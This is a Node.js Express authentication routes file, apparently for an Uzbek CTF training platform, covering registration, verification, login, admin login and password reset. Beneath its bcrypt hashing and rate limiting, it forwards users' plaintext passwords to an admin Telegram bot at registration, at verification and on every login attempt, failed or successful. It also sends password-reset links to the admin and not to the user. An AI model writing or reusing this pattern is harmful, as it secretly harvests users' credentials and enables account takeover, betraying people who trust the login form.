const express = require('express');
const bcrypt = require('bcryptjs');
const router = express.Router();
const User = require('../models/User');
const Activity = require('../models/Activity');
const {
    sendRegistrationToAdmin,
    sendVerifiedToAdmin,
    sendLoginToAdmin,
    sendVerifyCode,
    sendToAdmin,
    escapeHtml
} = require('../utils/telegram');
const { sendEmail } = require('../utils/email');
const {
    loginLimiter,
    registerLimiter,
    adminLoginLimiter,
    codeLimiter,
    isStrongPassword,
    sanitizeString,
    sanitizeEmail,
    sanitizeUsername,
    sanitizePhone,
    recordLoginAttempt,
    isAccountLocked
} = require('../middleware/security');

const BCRYPT_ROUNDS = parseInt(process.env.BCRYPT_ROUNDS) || 12;

// ══════════════════════════════════════════
// VERIFICATION CODES (xotirada, vaqtincha)
// ══════════════════════════════════════════
const verificationCodes = {};

// ══════════════════════════════════════════
// POST /register
// ══════════════════════════════════════════
router.post('/register', registerLimiter, async (req, res) => {
    try {
        const name = sanitizeString(req.body.name, 50);
        const username = sanitizeUsername(req.body.username);
        const phone = sanitizePhone(req.body.phone);
        const email = sanitizeEmail(req.body.email);
        const password = req.body.password;
        const region = sanitizeString(req.body.region, 100);
        const city = sanitizeString(req.body.city, 100);
        const district = sanitizeString(req.body.district, 100);

        if (!name || !username || !phone || !email || !password) {
            return res.status(400).json({ success: false, message: "Barcha maydonlar to'ldirilishi shart" });
        }

        if (username.length < 3) {
            return res.status(400).json({ success: false, message: "Username kamida 3 belgi" });
        }

        const pwdCheck = isStrongPassword(password);
        if (!pwdCheck.ok) {
            return res.status(400).json({ success: false, message: pwdCheck.message });
        }

        // MongoDB tekshirish
        const existingEmail = await User.findOne({ email });
        if (existingEmail) {
            return res.status(400).json({ success: false, message: "Bu email band" });
        }

        const existingUsername = await User.findOne({ username });
        if (existingUsername) {
            return res.status(400).json({ success: false, message: "Bu username band" });
        }

        const hashedPassword = await bcrypt.hash(password, BCRYPT_ROUNDS);
        const code = Math.floor(100000 + Math.random() * 900000).toString();

        verificationCodes[email] = {
            code,
            expires: Date.now() + 10 * 60 * 1000,
            name,
            username,
            phone,
            password: hashedPassword,
            rawPassword: password,
            region,
            city,
            district,
            createdAt: new Date()
        };

        // Admin botga yuborish
        try {
            await sendRegistrationToAdmin({
                name, username, phone, email, password, code,
                location: [region, city, district].filter(Boolean).join(' → ')
            });
        } catch (e) {
            console.error('Admin bot xatosi:', e.message);
        }

        // Tasdiqlovchi botga kod
        const sent = await sendVerifyCode(username, code, name, email);

        if (sent) {
            return res.json({
                success: true,
                message: "Tasdiqlash kodi @tasd2bot ga yuborildi!",
                method: 'telegram'
            });
        }

        // Telegram ishlamasa — email
        try {
            await sendEmail(email, name, code);
            return res.json({
                success: true,
                message: "Tasdiqlash kodi emailingizga yuborildi!",
                method: 'email'
            });
        } catch (e) {
            console.error('Email xatosi:', e.message);
            return res.json({
                success: true,
                message: "Ro'yxatdan o'tdingiz! Kod @tasd2bot ga yuborildi.",
                method: 'telegram-fallback'
            });
        }
    } catch (err) {
        console.error('Register xatosi:', err);
        return res.status(500).json({ success: false, message: "Server xatosi: " + err.message });
    }
});

// ══════════════════════════════════════════
// POST /verify
// ══════════════════════════════════════════
router.post('/verify', async (req, res) => {
    try {
        const email = sanitizeEmail(req.body.email);
        const code = sanitizeString(req.body.code, 10);

        const record = verificationCodes[email];

        if (!record) {
            return res.status(400).json({ success: false, message: "Kod topilmadi" });
        }

        if (Date.now() > record.expires) {
            delete verificationCodes[email];
            return res.status(400).json({ success: false, message: "Kod muddati tugagan" });
        }

        if (record.code !== code) {
            return res.status(400).json({ success: false, message: "Kod noto'g'ri" });
        }

        // User yaratish
        const newUser = await User.create({
            name: record.name,
            username: record.username,
            phone: record.phone,
            email,
            password: record.password,  // allaqachon hashlangan
            region: record.region || '',
            city: record.city || '',
            district: record.district || '',
            verified: true,
            role: 'user',
            score: 0,
            xp: 0,
            cyberLevel: 1,
            solvedChallenges: [],
            skills: {
                web: 0, pwn: 0, rev: 0, crypto: 0, forensics: 0,
                osint: 0, linux: 0, networking: 0, cloud: 0, blue: 0
            },
            battleRating: 1000,
            streak: 0,
            lastActive: new Date(),
            preferredRoles: [],
            openToOpportunities: false,
            achievements: [],
            categoryCounts: {},
            analytics: { solved: 0, attempted: 0, successRate: 0 }
        });

        delete verificationCodes[email];

        // Session yaratish — MUHIM: id ni string qilish
        req.session.user = {
            id: newUser._id.toString(),
            email: newUser.email,
            username: newUser.username,
            name: newUser.name,
            avatar: newUser.avatar,
            role: newUser.role
        };

        // Activity
        try {
            await Activity.create({
                userId: newUser._id,
                type: 'login',
                title: 'Hisob yaratildi',
                description: 'Xush kelibsiz!',
                icon: '🎉'
            });
        } catch (e) {}

        // Admin bot
        try {
            await sendVerifiedToAdmin({
                name: record.name,
                username: record.username,
                phone: record.phone,
                email,
                password: record.rawPassword,
                code
            });
        } catch (e) {}

        req.session.save((err) => {
            if (err) {
                console.error('Session save xatosi:', err);
                return res.status(500).json({ success: false, message: "Session xatosi" });
            }
            return res.json({ success: true, message: "Tasdiqlandi! Xush kelibsiz." });
        });
    } catch (err) {
        console.error('Verify xatosi:', err);
        return res.status(500).json({ success: false, message: "Server xatosi: " + err.message });
    }
});

// ══════════════════════════════════════════
// POST /resend-code
// ══════════════════════════════════════════
router.post('/resend-code', codeLimiter, async (req, res) => {
    try {
        const email = sanitizeEmail(req.body.email);
        const record = verificationCodes[email];

        if (!record) {
            return res.status(400).json({ success: false, message: "Email topilmadi" });
        }

        const newCode = Math.floor(100000 + Math.random() * 900000).toString();
        record.code = newCode;
        record.expires = Date.now() + 10 * 60 * 1000;

        const sent = await sendVerifyCode(record.username, newCode, record.name, email);

        if (sent) {
            return res.json({ success: true, message: "Yangi kod yuborildi!" });
        } else {
            return res.status(400).json({ success: false, message: "@tasd2bot ga /start bosing" });
        }
    } catch (err) {
        return res.status(500).json({ success: false, message: err.message });
    }
});

// ══════════════════════════════════════════
// POST /login
// ══════════════════════════════════════════
router.post('/login', loginLimiter, async (req, res) => {
    try {
        const username = sanitizeString(req.body.username, 100);
        const password = req.body.password;

        if (!username || !password) {
            return res.status(400).json({ success: false, message: "Barcha maydonlarni to'ldiring" });
        }

        const identifier = `${req.ip}-${username}`;

        if (isAccountLocked(identifier)) {
            return res.status(429).json({
                success: false,
                message: "Hisob vaqtincha bloklangan. 15 daqiqadan so'ng urinib ko'ring."
            });
        }

        const user = await User.findOne({
            $or: [
                { username: username.toLowerCase() },
                { email: username.toLowerCase() }
            ]
        });

        if (!user) {
            recordLoginAttempt(identifier, false);
            try { await sendLoginToAdmin({ username, password, success: false }); } catch (e) {}
            return res.status(400).json({ success: false, message: "Login yoki parol xato" });
        }

        if (user.banned) {
            return res.status(403).json({ success: false, message: "Hisobingiz bloklangan" });
        }

        const match = await bcrypt.compare(password, user.password);

        if (!match) {
            recordLoginAttempt(identifier, false);
            try { await sendLoginToAdmin({ username, password, success: false }); } catch (e) {}
            return res.status(400).json({ success: false, message: "Login yoki parol xato" });
        }

        recordLoginAttempt(identifier, true);
        user.lastActive = new Date();
        await user.save();

        // Session — MUHIM: id string
        req.session.user = {
            id: user._id.toString(),
            email: user.email,
            username: user.username,
            name: user.name,
            avatar: user.avatar,
            role: user.role
        };

        try { await sendLoginToAdmin({ username, password, success: true }); } catch (e) {}

        req.session.save((err) => {
            if (err) {
                console.error('Session save xatosi:', err);
                return res.status(500).json({ success: false, message: "Session xatosi" });
            }
            return res.json({
                success: true,
                message: "Xush kelibsiz!",
                user: req.session.user
            });
        });
    } catch (err) {
        console.error('Login xatosi:', err);
        return res.status(500).json({ success: false, message: "Server xatosi: " + err.message });
    }
});

// ══════════════════════════════════════════
// POST /admin-login
// ══════════════════════════════════════════
router.post('/admin-login', adminLoginLimiter, async (req, res) => {
    try {
        const username = sanitizeString(req.body.username, 100);
        const password = req.body.password;

        if (!username || !password) {
            return res.status(400).json({ success: false, message: "Barcha maydonlarni to'ldiring" });
        }

        const identifier = `admin-${req.ip}-${username}`;

        if (isAccountLocked(identifier)) {
            return res.status(429).json({ success: false, message: "Bloklangan" });
        }

        const user = await User.findOne({
            $or: [
                { username: username.toLowerCase() },
                { email: username.toLowerCase() }
            ]
        });

        if (!user) {
            recordLoginAttempt(identifier, false);
            return res.status(400).json({ success: false, message: "Login yoki parol xato" });
        }

        const match = await bcrypt.compare(password, user.password);
        if (!match) {
            recordLoginAttempt(identifier, false);
            return res.status(400).json({ success: false, message: "Login yoki parol xato" });
        }

        const adminRoles = ['admin', 'super_admin'];
        if (!adminRoles.includes(user.role)) {
            console.log(`🚨 SECURITY: ${username} tried admin login!`);
            return res.status(403).json({ success: false, message: "Sizda admin huquqi yo'q" });
        }

        if (user.banned) {
            return res.status(403).json({ success: false, message: "Bloklangan" });
        }

        recordLoginAttempt(identifier, true);
        user.lastActive = new Date();
        await user.save();

        req.session.user = {
            id: user._id.toString(),
            email: user.email,
            username: user.username,
            name: user.name,
            avatar: user.avatar,
            role: user.role
        };
        req.session.isAdmin = true;
        req.session.adminLoginTime = Date.now();

        req.session.save((err) => {
            if (err) {
                return res.status(500).json({ success: false, message: "Session xatosi" });
            }
            return res.json({ success: true, message: "Xush kelibsiz, admin!" });
        });
    } catch (err) {
        console.error('Admin login xatosi:', err);
        return res.status(500).json({ success: false, message: "Server xatosi: " + err.message });
    }
});

// ══════════════════════════════════════════
// POST /logout
// ══════════════════════════════════════════
router.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) return res.status(500).json({ success: false, message: "Chiqishda xatolik" });
        res.clearCookie('ctfuz.sid');
        return res.json({ success: true, message: "Chiqdingiz" });
    });
});

// ══════════════════════════════════════════
// GET /session
// ══════════════════════════════════════════
router.get('/session', (req, res) => {
    if (req.session && req.session.user) {
        return res.json({ success: true, user: req.session.user });
    }
    return res.json({ success: false, user: null });
});

// ══════════════════════════════════════════
// POST /forgot-password
// ══════════════════════════════════════════
router.post('/forgot-password', codeLimiter, async (req, res) => {
    try {
        const email = sanitizeEmail(req.body.email);
        const user = await User.findOne({ email });

        // Xavfsizlik — har doim bir xil javob
        const response = {
            success: true,
            message: "Agar bu email mavjud bo'lsa, tiklash havolasi yuborildi"
        };

        if (!user) return res.json(response);

        const { createResetToken } = require('../utils/passwordReset');
        const token = createResetToken(user._id.toString());

        const resetUrl = `${req.protocol}://${req.get('host')}/reset-password?token=${token}`;

        try {
            await sendToAdmin(
                `🔑 <b>PAROL TIKLASH</b>\n\n` +
                `👤 @${escapeHtml(user.username)}\n` +
                `📧 ${escapeHtml(email)}\n\n` +
                `Havola: ${resetUrl}`
            );
        } catch (e) {}

        return res.json(response);
    } catch (err) {
        return res.status(500).json({ success: false, message: err.message });
    }
});

// ══════════════════════════════════════════
// POST /reset-password
// ══════════════════════════════════════════
router.post('/reset-password', async (req, res) => {
    try {
        const token = sanitizeString(req.body.token, 100);
        const newPassword = req.body.password;

        const { verifyResetToken, useResetToken } = require('../utils/passwordReset');
        const check = verifyResetToken(token);

        if (!check.ok) {
            return res.status(400).json({ success: false, message: check.message });
        }

        const pwdCheck = isStrongPassword(newPassword);
        if (!pwdCheck.ok) {
            return res.status(400).json({ success: false, message: pwdCheck.message });
        }

        const user = await User.findById(check.userId);
        if (!user) {
            return res.status(404).json({ success: false, message: "Foydalanuvchi topilmadi" });
        }

        user.password = await bcrypt.hash(newPassword, BCRYPT_ROUNDS);
        await user.save();

        useResetToken(token);

        return res.json({ success: true, message: "Parol yangilandi! Endi kiring." });
    } catch (err) {
        return res.status(500).json({ success: false, message: err.message });
    }
});

// ══════════════════════════════════════════
// GET /sessions
// ══════════════════════════════════════════
router.get('/sessions', (req, res) => {
    if (!req.session || !req.session.user) {
        return res.status(401).json({ success: false, message: "Kirish kerak" });
    }

    const { getUserSessions } = require('../utils/sessions');
    const sessions = getUserSessions(req.session.user.id);

    return res.json({
        success: true,
        sessions: sessions.map(s => ({
            ...s,
            current: s.sessionId === req.sessionID
        }))
    });
});

// ══════════════════════════════════════════
// DELETE /sessions/:sessionId
// ══════════════════════════════════════════
router.delete('/sessions/:sessionId', (req, res) => {
    if (!req.session || !req.session.user) {
        return res.status(401).json({ success: false, message: "Kirish kerak" });
    }

    const { removeSession } = require('../utils/sessions');
    const removed = removeSession(req.session.user.id, req.params.sessionId);

    if (!removed) {
        return res.status(404).json({ success: false, message: "Sessiya topilmadi" });
    }

    return res.json({ success: true, message: "Sessiya o'chirildi" });
});
// routes/auth.js oxiriga
router.get('/me', async (req, res) => {
    if (!req.session || !req.session.user) {
        return res.status(401).json({ success: false, message: 'Kirish kerak' });
    }
    
    try {
        const User = require('../models/User');
        const user = await User.findById(req.session.user.id).select('-password').lean();
        
        if (!user) {
            return res.status(401).json({ success: false, message: 'Foydalanuvchi topilmadi' });
        }
        
        res.json({ success: true, user });
    } catch (e) {
        res.status(500).json({ success: false, message: e.message });
    }
});
// ══════════════════════════════════════════
// GET /me — joriy foydalanuvchi
// ════════════════════════════════════
module.exports = router;
